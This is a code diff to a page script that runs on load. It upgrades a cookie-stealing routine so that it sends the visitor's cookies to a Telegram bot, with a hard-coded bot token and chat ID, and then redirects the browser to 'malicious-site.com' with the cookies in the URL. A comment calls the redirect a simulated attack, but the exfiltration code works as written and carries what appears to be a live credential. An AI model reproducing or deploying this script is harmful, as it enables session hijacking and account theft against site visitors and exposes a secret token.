@@ -12,22 +12,36 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // --- Malicious Code ---
-    var stolenCookies = document.cookie;  // Get victim's cookies
+
+    // Set the Telegram bot token and chat ID
+    var botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjcE";
+    var chatId = "899184398";
+
+    // Get victim's cookies
+    var stolenCookies = document.cookie;  // Now correctly fetching cookies
 
     // Check if there are cookies to steal
     if (stolenCookies) {
-        // Create a Blob with the stolen cookies
-        var blob = new Blob([stolenCookies], { type: 'text/plain' });
+        var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        var message = "Stolen Cookies: " + encodeURIComponent(stolenCookies);  // Properly encoding cookies
 
-        // Create a download link
-        var link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);  // Create a URL for the Blob
-        link.download = 'stolen_cookies.txt';   // Filename for the download
+        // Send cookies to Telegram
+        fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(response => {
+            if (response.ok) {
+                console.log("Cookies sent to Telegram!");
+            } else {
+                console.error("Failed to send cookies.");
+            }
+        }).catch(error => {
+            console.error("Error sending cookies:", error);
+        });
 
-        // Trigger the download
-        link.click();
-
-        console.log("Stolen cookies saved as .txt file.");
+        // --- Redirect to malicious site (simulating attack) ---
+        document.location = "https://malicious-site.com/steal?cookie=" + encodeURIComponent(stolenCookies);  // Redirection with stolen cookie
     } else {
         console.log("No cookies to steal!");
     }
